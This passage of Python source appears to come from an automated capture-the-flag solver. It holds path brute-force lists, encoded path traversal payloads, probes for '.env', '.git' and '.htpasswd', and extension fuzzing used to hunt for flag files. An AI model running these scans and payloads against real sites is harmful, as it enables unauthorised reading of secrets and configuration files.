        '/private/flag.txt', '/private/secret.txt', '/private/hidden.txt',
        
        # Backup/Config
        '/backup', '/Backup', '/BACKUP', '/backup.txt', '/backup.sql', '/backup.zip',
        '/config', '/Config', '/CONFIG', '/config.txt', '/config.json', '/config.php',
        '/.env', '/.env.local', '/.env.production', '/.env.backup',
        
        # Debug/Test
        '/debug', '/Debug', '/DEBUG', '/debug.txt', '/debug.html', '/debug.php',
        '/test', '/Test', '/TEST', '/test.txt', '/test.html', '/test.php',
        '/dev', '/Dev', '/DEV', '/development', '/staging',
        
        # API endpoints
        '/api/flag', '/api/secret', '/api/hidden', '/api/admin',
        '/api/v1/flag', '/api/v1/secret', '/api/v2/flag',
        '/rest/flag', '/rest/secret', '/graphql',
        
        # Well-known
        '/.well-known/flag', '/.well-known/secret', '/.well-known/security.txt',
        
        # Robots/Sitemap
        '/robots.txt', '/sitemap.xml', '/sitemap.txt',
        
        # Source/Code
        '/source', '/Source', '/SOURCE', '/source.txt', '/source.zip',
        '/code', '/Code', '/CODE', '/src', '/Src', '/SRC',
        
        # Misc CTF paths
        '/for-real', '/For-Real', '/forreal', '/ForReal', '/For Real', '/For%20Real',
        '/real', '/Real', '/REAL', '/truth', '/Truth', '/TRUTH',
        '/final', '/Final', '/FINAL', '/final.txt', '/final.html',
        '/result', '/Result', '/RESULT', '/results', '/Results',
        '/output', '/Output', '/OUTPUT', '/output.txt',
        '/response', '/Response', '/RESPONSE', '/response.txt',
        '/message', '/Message', '/MESSAGE', '/message.txt',
        '/note', '/Note', '/NOTE', '/notes', '/Notes', '/NOTES',
        '/readme', '/Readme', '/README', '/README.md', '/readme.txt',
        '/info', '/Info', '/INFO', '/information', '/Information',
    ]

    def _ctf_path_bruteforce(self, url: str, result: ChallengeResult) -> str:
        """Bruteforce CTF-specific paths"""
        base_url = url.rstrip('/')
        
        # Also try paths relative to discovered hint pages
        hint_paths = []
        try:
            response = self.session.get(url, timeout=self.timeout)
            # Find any hint pages mentioned
            hint_patterns = [
                r'href=["\']([^"\']+)["\']',
                r'src=["\']([^"\']+)["\']',
            ]
            for pattern in hint_patterns:
                matches = re.findall(pattern, response.text)
                for match in matches:
                    if match.startswith('/') and not match.endswith(('.css', '.js', '.png', '.jpg', '.ico')):
                        hint_paths.append(match)
        except:
            pass
        
        # Check main CTF paths
        for path in self.CTF_PATHS[:100]:  # Limit for speed
            flag = self._check_path_for_flag(base_url, path, result)
            if flag:
                return flag
        
        # Check paths relative to hint pages
        for hint_path in hint_paths[:10]:
            hint_base = base_url + hint_path.rsplit('/', 1)[0] if '/' in hint_path else base_url
            for suffix in ['/flag.txt', '/secret.txt', '/goal.txt', '/hidden.txt', '/key.txt',
                          '/flag', '/secret', '/goal', '/hidden', '/key', '/answer.txt']:
                flag = self._check_path_for_flag(hint_base, suffix, result)
                if flag:
                    return flag
        
        return None

    def _encoded_path_discovery(self, url: str, result: ChallengeResult) -> str:
        """Discover paths hidden in encoded strings"""
        try:
            response = self.session.get(url, timeout=self.timeout)
            base_url = url.rstrip('/')
            
            # Find Base64 encoded strings that might be paths
            b64_pattern = r'[A-Za-z0-9+/]{10,}={0,2}'
            matches = re.findall(b64_pattern, response.text)
            
            for match in matches:
                try:
                    decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                    # Check if it looks like a path
                    if decoded.startswith('/') or decoded.startswith('./'):
                        result.add_log(f"Found Base64 encoded path: {decoded}")
                        flag = self._check_path_for_flag(base_url, decoded, result)
                        if flag:
                            return flag
                    # Check if decoded content contains a path
                    paths = re.findall(r'[/][a-zA-Z0-9_\-./]+', decoded)
                    for path in paths:
                        flag = self._check_path_for_flag(base_url, path, result)
                        if flag:
                            return flag
                except:
                    pass
            
            # Find hex encoded strings
            hex_pattern = r'(?:0x)?[0-9a-fA-F]{20,}'
            matches = re.findall(hex_pattern, response.text)
            
            for match in matches:
                try:
                    clean_hex = match.replace('0x', '')
                    decoded = bytes.fromhex(clean_hex).decode('utf-8', errors='ignore')
                    if decoded.startswith('/'):
                        result.add_log(f"Found hex encoded path: {decoded}")
                        flag = self._check_path_for_flag(base_url, decoded, result)
                        if flag:
                            return flag
                except:
                    pass
            
            # Find URL encoded paths
            url_encoded = re.findall(r'%2[fF][a-zA-Z0-9%]+', response.text)
            for encoded in url_encoded:
                try:
                    decoded = urllib.parse.unquote(encoded)
                    if decoded.startswith('/'):
                        flag = self._check_path_for_flag(base_url, decoded, result)
                        if flag:
                            return flag
                except:
                    pass
        except:
            pass
        return None

    def _path_traversal_attack(self, url: str, result: ChallengeResult) -> str:
        """Path traversal attacks to find flags"""
        base_url = url.rstrip('/')
        
        # Common path traversal payloads
        traversal_payloads = [
            '../flag.txt', '../../flag.txt', '../../../flag.txt',
            '../secret.txt', '../../secret.txt', '../../../secret.txt',
            '../hidden.txt', '../../hidden.txt', '../../../hidden.txt',
            '....//flag.txt', '....//....//flag.txt',
            '..%2fflag.txt', '..%2f..%2fflag.txt',
            '..%252fflag.txt', '..%252f..%252fflag.txt',
            '%2e%2e/flag.txt', '%2e%2e/%2e%2e/flag.txt',
            '..\\flag.txt', '..\\..\\flag.txt',
            '..//flag.txt', '../..//flag.txt',
        ]
        
        # Try traversal on common parameters
        params_to_test = ['file', 'path', 'page', 'doc', 'document', 'folder', 
                         'root', 'dir', 'load', 'read', 'include', 'src', 'url']
        
        for param in params_to_test:
            for payload in traversal_payloads[:10]:
                try:
                    test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=5)
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"Path traversal successful: {param}={payload}")
                        return flag
                except:
                    pass
        
        # Try direct traversal paths
        for payload in traversal_payloads:
            try:
                test_url = f"{base_url}/{payload}"
                response = self.session.get(test_url, timeout=5)
                if response.status_code == 200:
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"Direct path traversal: {payload}")
                        return flag
            except:
                pass
        
        return None

    def _hidden_directory_discovery(self, url: str, result: ChallengeResult) -> str:
        """Discover hidden directories using various techniques"""
        base_url = url.rstrip('/')
        
        # Hidden directory patterns
        hidden_dirs = [
            # Dot directories
            '/.hidden', '/.secret', '/.private', '/.admin', '/.backup',
            '/.data', '/.files', '/.config', '/.env', '/.git',
            
            # Underscore directories
            '/_hidden', '/_secret', '/_private', '/_admin', '/_backup',
            '/_data', '/_files', '/_config', '/_internal',
            
            # Double dot/underscore
            '/..hidden', '/__hidden', '/...', '/.../flag.txt',
            
            # Numeric directories
            '/0', '/1', '/2', '/123', '/1234', '/12345',
            '/001', '/002', '/003', '/000', '/999',
            
            # Date-based directories
            '/2024', '/2025', '/2026', '/backup-2024', '/backup-2025',
            
            # Hash-like directories
            '/a', '/b', '/c', '/d', '/e', '/f',
            '/aa', '/ab', '/ac', '/ad', '/ae', '/af',
            
            # Common hidden patterns
            '/~admin', '/~root', '/~user', '/~backup',
            '/.htaccess', '/.htpasswd', '/.DS_Store',
            '/WEB-INF', '/META-INF', '/BOOT-INF',
        ]
        
        for dir_path in hidden_dirs:
            try:
                test_url = base_url + dir_path
                response = self.session.get(test_url, timeout=5)
                if response.status_code == 200:
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"Found flag in hidden directory: {dir_path}")
                        return flag
                    
                    # Check for flag files in this directory
                    for file_name in ['flag.txt', 'secret.txt', 'key.txt', 'hidden.txt', 'goal.txt']:
                        file_url = test_url.rstrip('/') + '/' + file_name
                        try:
                            file_response = self.session.get(file_url, timeout=5)
                            if file_response.status_code == 200:
                                flag = self.extract_flag(file_response.text)
                                if flag:
                                    result.add_log(f"Found flag at: {dir_path}/{file_name}")
                                    return flag
                        except:
                            pass
            except:
                pass
        
        return None

    def _extension_fuzzing(self, url: str, result: ChallengeResult) -> str:
        """Fuzz file extensions on discovered paths"""
        base_url = url.rstrip('/')
        
        # Extensions to try
        extensions = [
            '', '.txt', '.html', '.htm', '.php', '.asp', '.aspx', '.jsp',
            '.json', '.xml', '.yaml', '.yml', '.md', '.markdown',
            '.bak', '.backup', '.old', '.orig', '.save', '.swp', '.tmp',
            '.log', '.sql', '.db', '.sqlite',
            '.zip', '.tar', '.gz', '.rar',
            '.png', '.jpg', '.gif', '.wav', '.mp3',
            '.pdf', '.doc', '.docx', '.xls', '.xlsx',
        ]
        
        # Base names to try with all extensions
        base_names = ['flag', 'Flag', 'FLAG', 'secret', 'Secret', 'SECRET',
                     'hidden', 'Hidden', 'HIDDEN', 'key', 'Key', 'KEY',
                     'password', 'Password', 'admin', 'Admin', 'data', 'Data',
                     'config', 'Config', 'backup', 'Backup', 'goal', 'Goal',
                     'answer', 'Answer', 'hint', 'Hint', 'clue', 'Clue']
        
        # Try each combination
        for base_name in base_names:
            for ext in extensions:
                path = f"/{base_name}{ext}"
                flag = self._check_path_for_flag(base_url, path, result)
                if flag:
                    return flag
        
        # Also try in common subdirectories
        subdirs = ['download', 'files', 'data', 'static', 'assets', 'public', 'private']
        for subdir in subdirs:
            for base_name in ['flag', 'secret', 'hidden', 'goal', 'key']:
                for ext in ['.txt', '.html', '.json', '']:
                    path = f"/{subdir}/{base_name}{ext}"
                    flag = self._check_path_for_flag(base_url, path, result)
                    if flag:
                        return flag
        
        return None

    def _check_path_for_flag(self, base_url: str, path: str, result: ChallengeResult) -> str:
        """Check a path for flags with smart content analysis"""
        try:
            # Normalize path
            if not path.startswith('/') and not path.startswith('http'):
                path = '/' + path
            
            if path.startswith('http'):
                test_url = path
            else:
                test_url = base_url + path
            
            response = self.session.get(test_url, timeout=5)
            
            if response.status_code == 200:
                content = response.text
                content_length = len(content)
                
                # Skip empty or very small responses
                if content_length < 5:
                    return None
                
                # Skip obvious error pages
                error_indicators = ['404', 'not found', 'error', 'forbidden', 'denied']
                if content_length < 500 and any(err in content.lower() for err in error_indicators):
                    return None
                
                # Check for flag patterns
                flag = self.extract_flag(content)
                if flag:
                    result.add_log(f"Found flag at path: {path}")
                    return flag
                
                # Check if content looks like readable text (potential flag)
                if content_length < 500:
                    # Clean content
                    clean_content = content.strip()
                    clean_content = re.sub(r'<[^>]+>', '', clean_content)  # Remove HTML tags
                    clean_content = clean_content.strip()
                    
                    if clean_content and len(clean_content) > 3:
                        # Check if it's readable English-like text
                        if re.match(r'^[a-zA-Z0-9_\-\s{}\[\]().,!?:;@#$%^&*+=]+$', clean_content):
                            # Looks like a potential flag or answer
                            if not any(x in clean_content.lower() for x in ['<!doctype', '<html', '<head', '<body']):
                                result.add_log(f"Found potential answer at {path}: {clean_content[:100]}")
                                return clean_content
        except:
            pass
        return None
